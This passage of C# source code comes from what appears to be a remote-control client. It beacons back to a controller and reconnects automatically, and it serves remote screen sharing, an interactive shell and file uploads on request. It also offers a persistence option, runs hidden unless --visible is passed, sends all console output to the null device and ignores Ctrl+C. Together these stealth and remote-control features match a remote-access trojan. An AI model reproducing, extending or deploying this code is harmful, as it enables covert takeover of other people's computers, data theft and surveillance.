                            try { streamStop.Cancel(); } catch { }
                            Protocol.SendMsg(clientSocket, new JsonObject
                            {
                                ["type"] = "error",
                                ["id"] = reqId?.DeepClone(),
                                ["data"] = "screenshare: " + ex.Message
                            });
                        }
                        continue;
                    }

                    if (mtype == "screenshare_stop")
                    {
                        if (!ScreenCapture.StopStream())
                        {
                            Protocol.SendMsg(clientSocket, new JsonObject
                            {
                                ["type"] = "output",
                                ["id"] = reqId?.DeepClone(),
                                ["data"] = "[client] no screen share is running"
                            });
                        }
                        continue;
                    }

                    if (mtype == "shell")
                    {
                        var tokenNode = JsonUtil.Get(msg, "token");
                        var token = JsonUtil.Str(msg, "token");
                        if (!IsTruthy(tokenNode) || string.IsNullOrEmpty(token))
                        {
                            Protocol.SendMsg(clientSocket, new JsonObject
                            {
                                ["type"] = "error",
                                ["id"] = reqId?.DeepClone(),
                                ["data"] = "shell: controller sent no token; " +
                                         "update both scripts together"
                            });
                            continue;
                        }
                        Shell.StartInteractiveShell(clientSocket, targetIp, targetPort,
                            targetScheme, token, reqId);
                        continue;
                    }

                    Protocol.SendMsg(clientSocket, new JsonObject
                    {
                        ["type"] = "error",
                        ["id"] = reqId?.DeepClone(),
                        ["data"] = $"unknown message type: {mtype ?? "None"}"
                    });
                }
            }
            catch (IOException ex)
            {
                Log.Error($"[!] Connection error: {ex.Message}. Reconnecting...");
            }
            catch (Exception ex)
            {
                Log.Error($"[!] Unexpected error: {ex.Message}. Reconnecting...");
            }

            try { ScreenCapture.StopStream(0.5); } catch { }
            try { Shell.StopShell(); } catch { }
            try { Transfers.AbortOutgoingTransfers(); } catch { }
            try { Transfers.AbortIncomingTransfers(); } catch { }
            try { clientSocket.ShutdownBoth(); } catch { }
            try { clientSocket.Close(); } catch { }

            if (stop)
            {
                Log.Info("[+] Controller requested shutdown. Exiting.");
                break;
            }
            Thread.Sleep(TimeSpan.FromMilliseconds(Cfg.ReconnectDelayMs));
        }
    }

    /// <summary>
    /// HTTP polling is the reliable last resort, but it is much slower than a
    /// WebSocket.  Once per poll connection, test whether the tunnel now
    /// accepts a WebSocket upgrade and remember it for the next reconnect.
    /// The probe deliberately does not send the control hello, so it cannot
    /// create a second live session.
    /// </summary>
    private static void StartPollUpgradeProbe(string host, int port, string scheme, Conn conn)
    {
        var seconds = 60;
        var configured = Environment.GetEnvironmentVariable("CMON_POLL_UPGRADE_SECONDS");
        if (int.TryParse(configured, out var parsed) && parsed >= 1) seconds = parsed;
        var thread = new Thread(() =>
        {
            try
            {
                Thread.Sleep(TimeSpan.FromSeconds(seconds));
                if (conn.IsClosed) return;
                // Never disturb a command, shell, transfer or live screen.
                if (Shell.IsRunning || ScreenCapture.StreamRunning() || Transfers.AnyActive
                    || DeferredRequests.Count > 0 || Commands.Busy) return;
                if (!Transports.ProbeWebSocket(host, port, scheme)) return;
                if (Shell.IsRunning || ScreenCapture.StreamRunning() || Transfers.AnyActive
                    || DeferredRequests.Count > 0 || Commands.Busy)
                {
                    Log.Info("[*] A faster WebSocket transport is available; it will be used on the next reconnect.");
                    return;
                }
                Log.Info("[*] A faster WebSocket transport is available; switching now.");
                try { conn.Close(); } catch { }
            }
            catch { }
        })
        {
            IsBackground = true,
            Name = "poll-upgrade"
        };
        thread.Start();
    }

    private static bool CancelExempt(string? mtype)
        => mtype is "exit" or "hello" or "cancel" or "cmd_kill"
            or "screenshare_stop" or "transfer_begin" or "transfer_entries"
            or "transfer_file_begin" or "transfer_chunk" or "transfer_file_end"
            or "transfer_abort" or "transfer_end";

    private static bool TryTextField(JsonObject msg, string key, out string value)
    {
        value = "";
        if (!msg.TryGetPropertyValue(key, out var node) || node is not JsonValue json)
            return false;
        if (!json.TryGetValue<string>(out var text)) return false;
        value = text;
        return true;
    }

    private static bool IsTruthy(JsonNode? node)
    {
        if (node is not JsonValue value) return false;
        if (value.TryGetValue<bool>(out var b)) return b;
        if (value.TryGetValue<string>(out var s)) return s.Length > 0;
        if (value.TryGetValue<long>(out var l)) return l != 0;
        if (value.TryGetValue<double>(out var d)) return d != 0 && !double.IsNaN(d);
        return false;
    }

    // ------------------------------------------------------------------
    // Legacy (single-message) upload
    // ------------------------------------------------------------------

    private static void HandleLegacyUpload(Conn conn, JsonObject msg, JsonNode? reqId,
        string currentDir)
    {
        var rawName = (JsonUtil.Str(msg, "name") ?? "uploaded.bin").Replace('\\', '/');
        var name = rawName;
        var slash = name.LastIndexOf('/');
        if (slash >= 0) name = name[(slash + 1)..];
        name = name.Replace('\0', '_');
        if (name is "" or "." or "..") name = "uploaded.bin";
        if (Platform.IsWindows)
        {
            var stem = name.Split('.', 2)[0].TrimEnd(' ', '.').ToUpperInvariant();
            var reserved = stem is "CON" or "PRN" or "AUX" or "NUL"
                           || (stem.Length == 4
                               && (stem.StartsWith("COM", StringComparison.Ordinal)
                                   || stem.StartsWith("LPT", StringComparison.Ordinal))
                               && stem[3] is >= '1' and <= '9');
            if (reserved || name.Contains(':'))
                name = "_" + name.Replace(':', '_');
            name = name.TrimEnd(' ', '.');
            if (name.Length == 0) name = "uploaded.bin";
        }
        var dest = Path.Combine(currentDir, name);
        try
        {
            if (!msg.TryGetPropertyValue("data", out var dataNode) || dataNode is not JsonValue dataValue
                || !dataValue.TryGetValue<string>(out var encoded))
            {
                if (dataNode == null) encoded = "";
                else throw new FormatException("upload data is not text");
            }
            var decodedSize = (long)encoded.Length * 3 / 4;
            if (decodedSize > Cfg.MaxMsg)
                throw new FormatException("legacy upload exceeds one protocol message; use the streamed transfer");
            var data = StrictBase64(encoded);
            if (data.Length > Cfg.MaxMsg)
                throw new FormatException("legacy upload exceeds one protocol message; use the streamed transfer");

            var tmp = Path.Combine(currentDir, ".upload-" + Guid.NewGuid().ToString("N"));
            try
            {
                using (var stream = new FileStream(tmp, FileMode.CreateNew, FileAccess.Write,
                           FileShare.None))
                    stream.Write(data, 0, data.Length);
                File.Move(tmp, dest, overwrite: true);
            }
            catch
            {
                try { File.Delete(tmp); } catch { }
                throw;
            }
            Protocol.SendMsg(conn, new JsonObject
            {
                ["type"] = "output",
                ["id"] = reqId?.DeepClone(),
                ["data"] = $"Saved to {dest} ({data.Length} bytes)"
            });
        }
        catch (Exception ex)
        {
            Protocol.SendMsg(conn, new JsonObject
            {
                ["type"] = "error",
                ["id"] = reqId?.DeepClone(),
                ["data"] = "upload failed: " + ex.Message
            });
        }
    }

    private static byte[] StrictBase64(string value)
    {
        foreach (var ch in value)
        {
            if ((ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z')
                || (ch >= '0' && ch <= '9') || ch is '+' or '/' or '=')
                continue;
            throw new FormatException("Only base64-encoded characters are allowed.");
        }
        return Convert.FromBase64String(value);
    }

    // ------------------------------------------------------------------
    // Argument parsing
    // ------------------------------------------------------------------

    private sealed record ParsedArgs(string Host, int Port, string Scheme,
        bool Persist, bool Remove, bool Visible, string? LogFile);

    private static ParsedArgs ParseArgs(string[] argv)
    {
        var ip = Cfg.DefaultIp;
        int? portOverride = null;
        var persist = false;
        var remove = false;
        var visible = false;
        string? logFile = null;
        var positional = new List<string>();
        for (var i = 0; i < argv.Length; i++)
        {
            var arg = argv[i];
            if (arg == "--persist") persist = true;
            else if (arg is "--remove-persist" or "--remove") remove = true;
            else if (arg == "--visible") visible = true;
            else if (arg is "--log-file" or "--logfile")
            {
                if (i + 1 < argv.Length) logFile = argv[++i];
                else Log.Error("[!] --log-file needs a path; ignoring it.");
            }
            else if (arg.StartsWith("--log-file=", StringComparison.Ordinal))
            {
                var value = arg.Split('=', 2)[1];
                logFile = value.Length > 0 ? value : null;
            }
            else if (arg.StartsWith('-') && arg != "-")
                Log.Error($"[!] Unknown option '{arg}'; ignoring it.");
            else positional.Add(arg);
        }
        if (positional.Count > 2)
            Log.Error("[!] Extra arguments ignored: " + string.Join(' ', positional.Skip(2)));
        if (positional.Count > 0) ip = positional[0];
        if (positional.Count > 1)
        {
            if (int.TryParse(positional[1], NumberStyles.Integer,
                    CultureInfo.InvariantCulture, out var value))
                portOverride = value;
            else Log.Error($"[!] '{positional[1]}' is not a port number; ignoring it.");
        }

        try
        {
            var parsed = NetUtil.ParseAddress(ip, portOverride);
            return new ParsedArgs(parsed.Host, parsed.Port, parsed.Scheme,
                persist, remove, visible, logFile);
        }
        catch (Exception ex)
        {
            Log.Error($"[!] Bad controller address '{ip}': {ex.Message}; " +
                      $"using {Cfg.DefaultIp}:{Cfg.DefaultPort}.");
            var fallback = NetUtil.ParseAddress(Cfg.DefaultIp);
            return new ParsedArgs(fallback.Host, fallback.Port, fallback.Scheme,
                persist, remove, visible, logFile);
        }
    }

    // ------------------------------------------------------------------
    // Zero-console-output and Ctrl+C immunity
    // ------------------------------------------------------------------

    private static void SilenceConsole()
    {
        try
        {
            Console.SetOut(TextWriter.Null);
            Console.SetError(TextWriter.Null);
        }
        catch { }
        try
        {
            if (Platform.IsWindows)
            {
                var handle = Native.CreateFileW("NUL", 0x40000000, 3, IntPtr.Zero,
                    3, 0, IntPtr.Zero);
                if (handle != IntPtr.Zero && handle != new IntPtr(-1))
                {
                    Native.SetStdHandle(-11, handle);
                    Native.SetStdHandle(-12, handle);
                }
            }
            else
            {
                var fd = Native.open("/dev/null", 1, 0);
                if (fd >= 0)
                {
                    Native.dup2(fd, 1);
                    Native.dup2(fd, 2);
                    if (fd > 2) Native.CloseFd(fd);
                }
            }
        }
        catch { }
    }

    private static void ImmureToCtrlC()
    {
        try { Console.CancelKeyPress += (_, e) => e.Cancel = true; } catch { }
        try
        {
            _sigint = PosixSignalRegistration.Create(PosixSignal.SIGINT, context =>
            {
                context.Cancel = true;
            });
        }
        catch { }
    }

    private static void WindowsDpiAware()
    {
        if (!Platform.IsWindows) return;
        try
        {
            if (Native.SetProcessDpiAwarenessContext(new IntPtr(-4))) return;
        }
        catch { }
        try
        {
            Native.SetProcessDpiAwareness(2);
            return;
        }
        catch { }
        try { Native.SetProcessDPIAware(); } catch { }
    }

    private static void EnsureAndroidWakeLock()
    {
        if (_wakeLockHeld) return;
        AndroidWakeLock(true);
        _wakeLockHeld = true;
    }

    private static void AndroidWakeLock(bool enable)
    {
        if (!Platform.IsAndroid()) return;
        var name = enable ? "termux-wake-lock" : "termux-wake-unlock";
        var exe = Platform.Which(name);
        if (string.IsNullOrEmpty(exe)) return;
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = exe,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using var proc = Process.Start(psi);
            if (proc == null) return;
            _ = proc.StandardOutput.ReadToEndAsync();
            _ = proc.StandardError.ReadToEndAsync();
            if (!proc.WaitForExit(5000))
            {
                try { proc.Kill(true); } catch { }
            }
        }
        catch { }
    }

    // ------------------------------------------------------------------
    // Helper entry points (run before console silencing)
    // ------------------------------------------------------------------

    public static class PosixExecHelper
    {
        public static int Run(string[] args)
        {
            if (args.Length < 2) return 127;
            var executable = args[1];
            try { Commands.Posix.setsid(); } catch { }
            var pointers = new IntPtr[args.Length];
            var allocated = new List<IntPtr>();
            try
            {
                for (var i = 1; i < args.Length; i++)
                {
                    var ptr = Marshal.StringToCoTaskMemUTF8(args[i]);
                    pointers[i - 1] = ptr;
                    allocated.Add(ptr);
                }
                pointers[^1] = IntPtr.Zero;
                Commands.Posix.execvp(executable, pointers);
            }
            catch { }
            finally
            {
                foreach (var ptr in allocated) Marshal.FreeCoTaskMem(ptr);
            }
            Commands.Posix._exit(127);
            return 127;
        }
    }

    public static class CtrlCHelper
    {
        private const uint AttachParentProcess = 0xffffffff;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FreeConsole();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool AttachConsole(uint processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetConsoleCtrlHandler(IntPtr handler, bool add);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GenerateConsoleCtrlEvent(uint eventId, uint processGroupId);

        public static int Run(uint pid)
        {
            try
            {
                FreeConsole();
                var attached = false;
                for (var i = 0; i < 100; i++)
                {
                    if (AttachConsole(pid)) { attached = true; break; }
                    Thread.Sleep(50);
                }
                if (!attached) return 2;
                SetConsoleCtrlHandler(IntPtr.Zero, true);
                var output = Console.OpenStandardOutput();
                var input = new StreamReader(Console.OpenStandardInput(), Encoding.ASCII);
                var writer = new StreamWriter(output, new UTF8Encoding(false))
                {
                    AutoFlush = true,
                    NewLine = "\n"
                };
                writer.WriteLine("R");
                while (true)
                {
                    var line = input.ReadLine();
                    if (line == null) break;
                    if (line.Trim() != "C") continue;
                    writer.WriteLine(GenerateConsoleCtrlEvent(0, 0) ? "D" : "E");
                }
                return 0;
            }
            catch { return 2; }
        }
    }

    private static class Native
    {
        [DllImport("libc", SetLastError = true)]
        public static extern int open([MarshalAs(UnmanagedType.LPUTF8Str)] string path, int flags, uint mode);

        [DllImport("libc", SetLastError = true)]
        public static extern int dup2(int oldFd, int newFd);

        [DllImport("libc", SetLastError = true, EntryPoint = "close")]
        public static extern int CloseFd(int fd);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr CreateFileW(string name, uint access, uint share,
            IntPtr security, uint creation, uint flags, IntPtr template);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetStdHandle(int which, IntPtr handle);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SetProcessDpiAwarenessContext(IntPtr context);

        [DllImport("shcore.dll", SetLastError = true)]
        public static extern int SetProcessDpiAwareness(int awareness);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SetProcessDPIAware();
    }
}
}
